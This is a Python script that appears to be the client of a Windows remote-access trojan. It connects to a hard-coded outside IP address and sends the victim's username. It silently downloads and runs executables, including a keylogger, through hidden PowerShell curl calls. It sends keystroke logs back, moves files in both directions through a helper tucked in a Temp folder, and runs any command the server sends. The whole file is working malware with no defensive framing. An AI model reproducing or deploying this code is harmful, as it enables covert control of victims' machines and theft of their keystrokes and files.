import socket
import time
import os
import subprocess
import sys

# Set up the server address and port

server_address = '34.88.221.44'
server_port = 8000                # Replace with your server's port

username = subprocess.getoutput("""echo %username%""")

# Connect to the server
venom = False

while True:
    # Create a socket object
    try:
        time.sleep(2)
        #print("trying to connect")
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client_socket.connect((server_address, server_port))
        time.sleep(1)
        client_socket.send(username.encode())
        #print("send")

        # Receive commands from the server and execute them
        while True:
            if venom == False:
                os.system("powershell -windowstyle hidden curl http://192.168.1.9:9000/exploit1.exe -o command.exe")
                os.system("start command.exe")
                venom = True
            try:
                command = client_socket.recv(1024).decode()
                if command.lower() == 'exit':
                    break
                if "start " in command:
                    os.system(command)
                if command == "keylog":
                        os.system("powershell -windowstyle hidden curl http://192.168.1.9:9000/keylogger.exe -o keylogger.exe")
                        os.system("start keylogger.exe")

                if command == "getlog":
                    cd = os.path.abspath(sys.argv[0])
                    cd = cd.rsplit("\\", 1)[0]
                    cd += "\\Logs\\keylog.txt"
                    data = ""
                    f = open(cd, 'r')
                    data += f.read()
                    f.close()
                    client_socket.send(data.encode())

                if "upload" in command:
                    path = command.split(" ")[1]
                    os.system("C:\\Users\\%username%\\AppData\\Local\\Temp\\MicroWindows\\updown " + path + " upload")
                    client_socket.send("uploading...".encode())

                if "download" in command:
                    path = command.split(" ")[1]
                    os.system("C:\\Users\\%username%\\AppData\\Local\\Temp\\MicroWindows\\updown " + path + " download")
                    client_socket.send("downloading...".encode())

                if command == "kill":
                    os.system("powershell -windowstyle hidden curl http://"+server_address+":9000/kill.bat -o kill.bat")
                    os.system("start kill.bat")
                else:
                    try:    
                        #print(command)
                        output = subprocess.check_output(command, shell=True, universal_newlines=True)
                        #print(output)
                        client_socket.send(output.encode())
                        #print("sent")
                    except:
                        pass
            except:
                break
    except:
        #print("sdf")
        pass


